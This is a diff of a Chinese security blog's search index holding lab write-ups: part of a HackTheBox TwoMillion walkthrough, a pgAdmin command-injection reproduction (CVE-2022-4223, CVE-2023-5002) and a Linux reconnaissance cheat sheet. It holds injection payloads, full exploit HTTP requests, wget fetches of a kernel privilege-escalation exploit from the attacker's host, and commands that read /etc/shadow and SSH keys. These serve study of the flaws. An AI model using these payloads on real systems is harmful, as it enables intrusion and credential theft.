class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$json</span>-&gt;username) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$json</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">regenerate_user_vpn</span>(<span class="variable">$router</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/usr/bin/cat /var/www/html/VPN/user/<span class="subst">$username</span>.ovpn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$output</span>) ? <span class="title function_ invoke__">implode</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>, <span class="variable">$output</span>) : <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>我们注意到<code>$username</code>传递给<code>regenerate_user_vpn</code>函数，并且只是要求username为json格式</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">regenerate_user_vpn</span>(<span class="params"><span class="variable">$router</span>, <span class="variable">$user</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$user</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$user</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">remove_special_chars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">           <span class="variable">$fileName</span> = <span class="variable">$username</span>. <span class="string">&quot;.ovpn&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$username</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">download_vpn</span>(<span class="variable">$fileName</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么在传递到<code>regenerate_user_vpn</code>函数后很明显是可以命令拼接，利用<code>;</code>来实现命令注入</p>
+<p>拼接结果如下，执行id命令并注释掉后面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;/bin/bash /var/www/html/VPN/gen.sh test;id#&quot;, $output, $return_var);</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，我们ls一下发现存在<code>.env</code>文件，应该存在个人信息</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416222758989.png"></p>
+<p>得到admin用户的密码，那么我们直接连接本地数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u admin -p -h localhost</span><br></pre></td></tr></table></figure>
+
+<p>得到其他用户的个人信息</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416224613203.png"></p>
+<p>不过没什么用，因为我们可以直接ssh连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh admin@10.10.11.221</span><br><span class="line">SuperDuperPass123</span><br></pre></td></tr></table></figure>
+
+<p>连接上后，先在<code>/home/admin/</code>拿到user的flag</p>
+<p>然后参考wp说是有hint，在<code>/var/mail/admin</code></p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416233525168.png"></p>
+<p>经过搜索找到OverlayFS 内核漏洞 （CVE-2023-0386）</p>
+<p><a href="https://github.com/Fanxiaoyao66/CVE-2023-0386">exp链接</a></p>
+<p>我们先开启http服务，在靶机用wget命令复制到<code>/tmp</code>目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.57/exp.sh</span><br><span class="line">wget http://10.10.14.57/fuse.c</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>/bin/bash exp.sh</code>，成功提权（该目录还有其他师傅传的exp）</p>
+<p><img src="/article/TwoMillion-HackTheBox/image-20240416234624574.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ejs默认配置之原型链污染</title>
     <url>/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html</url>
     <content><![CDATA[<p>ejs默认配置造成原型链污染</p>
@@ -2293,150 +2554,6 @@
         <tag>模板注入</tag>
         <tag>原型链污染</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
-<span id="more"></span>
-
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
-</blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>信息搜集</title>
-    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
-    <content><![CDATA[<p>渗透测试的信息搜集</p>
-<span id="more"></span>
-
-<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
-<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
-<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
-<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
-<ul>
-<li><p><code>uname -a</code> 所有版本</p>
-</li>
-<li><p><code>uname -r</code> 内核版本信息</p>
-</li>
-<li><p><code>uname -n</code> 系统主机名字</p>
-</li>
-<li><p><code>uname -m</code> Linux内核架构</p>
-</li>
-<li><p>文件系统 <code>df -a</code></p>
-</li>
-</ul>
-<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
-<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
-</li>
-<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
-</li>
-<li><p>查询用户的基本信息 finger</p>
-</li>
-<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
-</li>
-<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
-</li>
-<li><p>目前登录的用户 <code>w</code></p>
-</li>
-<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
-</li>
-<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
-</li>
-<li><p>登录成功日志 <code>/var/log/secure</code></p>
-</li>
-<li><p>登录失败日志 <code>/var/log/faillog</code></p>
-</li>
-<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
-</li>
-<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
-</li>
-<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
-</li>
-<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
-</li>
-<li><p>查看具有sudo权限的用户</p>
-<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
-</li>
-</ul>
-<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
-<li>打印系统环境信息 <code>env</code></li>
-<li>打印系统环境信息 <code>set</code></li>
-<li>环境变量中的路径信息 <code>echo $PATH</code></li>
-<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
-<li>显示当前路径 <code>pwd</code></li>
-<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
-<li>显示可用的shell <code>cat /etc/shells</code></li>
-</ul>
-<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
-<li>查看进程信息 <code>ps aux</code></li>
-<li>资源占有情况 <code>top -c</code></li>
-<li>查看进程关联文件 <code>lsof -c $PID</code></li>
-<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
-<li>进程的命令名 <code>/proc/$PID/comm</code></li>
-<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
-<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
-<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
-<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
-</ul>
-<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
-<li><code>~/.ssh</code></li>
-<li><code>/etc/ssh</code></li>
-</ul>
-<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
-<li><code>/var/log/*</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
   </entry>
   <entry>
     <title>fastjson入门学习</title>
@@ -2694,6 +2811,229 @@
       </tags>
   </entry>
   <entry>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+<span id="more"></span>
+
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>信息搜集</title>
+    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
+    <content><![CDATA[<p>渗透测试的信息搜集</p>
+<span id="more"></span>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
+<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
+<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
+<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
+<ul>
+<li><p><code>uname -a</code> 所有版本</p>
+</li>
+<li><p><code>uname -r</code> 内核版本信息</p>
+</li>
+<li><p><code>uname -n</code> 系统主机名字</p>
+</li>
+<li><p><code>uname -m</code> Linux内核架构</p>
+</li>
+<li><p>文件系统 <code>df -a</code></p>
+</li>
+</ul>
+<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
+<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
+</li>
+<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
+</li>
+<li><p>查询用户的基本信息 finger</p>
+</li>
+<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
+</li>
+<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
+</li>
+<li><p>目前登录的用户 <code>w</code></p>
+</li>
+<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
+</li>
+<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
+</li>
+<li><p>登录成功日志 <code>/var/log/secure</code></p>
+</li>
+<li><p>登录失败日志 <code>/var/log/faillog</code></p>
+</li>
+<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
+</li>
+<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
+</li>
+<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
+</li>
+<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
+</li>
+<li><p>查看具有sudo权限的用户</p>
+<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
+</li>
+</ul>
+<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
+<li>打印系统环境信息 <code>env</code></li>
+<li>打印系统环境信息 <code>set</code></li>
+<li>环境变量中的路径信息 <code>echo $PATH</code></li>
+<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
+<li>显示当前路径 <code>pwd</code></li>
+<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
+<li>显示可用的shell <code>cat /etc/shells</code></li>
+</ul>
+<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
+<li>查看进程信息 <code>ps aux</code></li>
+<li>资源占有情况 <code>top -c</code></li>
+<li>查看进程关联文件 <code>lsof -c $PID</code></li>
+<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
+<li>进程的命令名 <code>/proc/$PID/comm</code></li>
+<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
+<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
+<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
+<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
+</ul>
+<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
+<li><code>~/.ssh</code></li>
+<li><code>/etc/ssh</code></li>
+</ul>
